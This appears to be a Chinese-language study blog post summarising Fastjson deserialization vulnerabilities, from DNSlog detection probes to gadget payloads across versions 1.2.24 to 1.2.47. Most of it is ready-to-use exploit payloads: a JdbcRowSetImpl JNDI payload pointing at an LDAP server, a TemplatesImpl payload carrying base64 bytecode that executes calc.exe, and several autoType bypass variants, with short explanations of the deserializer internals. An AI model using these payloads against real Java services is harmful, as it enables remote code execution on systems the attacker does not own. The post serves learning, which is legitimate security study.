# Fastjson
1、关于Fastjson一些相关东西

2、感觉jackson和Fastjson差不多就放一起了(后面自己又写了一下jdbc的链子，跟fastjson就一模一样)


# 总结一下Fastjson

不知道最近为什么感觉有点东西努力却够不到...小的地方又足够了（不知道是自负还是自信），一位好师傅也是好朋友告诉我：认为我需要再去学习一个Fastjson。来来回回看了很多次的Fastjson，真的很烦。
静心学吧，做个总结：

## 探测Fastjson

```java
{"@type":"java.net.InetSocketAddress"{"address":, "val":"dnslog"}
```

```java
{"@type":"java.net.Inet4Address", "val":"dnslog"}
```

```java
{"@type":"java.net.Inet6Address", "val":"dnslog"}
```

```java
{{"@type":"java.net.URL", "val":"dnslog"}:"a"}
```

## Fastjson1.2.24

### JdbcRowSetImpl

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Basic/Command/calc", "autoCommit":false}
```

`看懂这个POC`：
第一点：Fatsjson为什么会加载@type里面的类？

![image-20221228203444952](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282034053.png)

后续利用ASM将其实例化
![image-20221228212643938](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282126087.png)

第二点：Fastjson为什么会调用setAutoCommit、getDataSourceName方法？
下面第五点回答。

第三点：Fastjson调用什么样的setter方法？
![image-20221228204850801](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282048955.png)

第四点：为什么参数是dataSourceName、autoCommit？？
![image-20221228205155372](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282051501.png)

先于目标类中的属性比较在于目标类的父类比较，都找不到进入下面if判断
![image-20221228205620922](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282056043.png)

如果还是为NULL，会将其增加到fieldList中。后续也是`对应`获取相应属性所以参数格式被固定化了。

![image-20221228220630736](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282206838.png)

后续如果获取到了fieldDeserializer就不会获取其属性。也就说Fastjson其实是先判断能不能获取到方法，再获取其属性。

第五点：Fastjson如何给dataSourceName、autoCommit赋值，能否赋值多个？？
肯定不能赋值多个只获取了一个值且该值为String类型。

![image-20221228212958088](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282129205.png)而再setValue中会反射调用此方法。所以回答了第二个问题。

### TemplatesImpl

```java
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk"],"_name":"a.b","_tfactory":{},"_outputProperties":{ }}
```

`看懂这个poc`：
第一点：可能唯一的以为是_outputProperties上面的第四点其实有说到
第二点：为什么Base64编码？
获取值得时候会进行Base64解码：
![image-20221228224023817](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212282240929.png)

## Fastjson1.2.25-1.2.41

```java
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://","autoCommit":true}
```

## Fastjson1.2.25-1.2.42

```java
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://","autoCommit":true}
```

## Fastjson1.2.25-1.2.43

```java
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://","autoCommit":true}
```

## 1.2.25<Fastjson<1.2.47

```java
{
    "1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://", 
        "autoCommit": true
    }
}
```

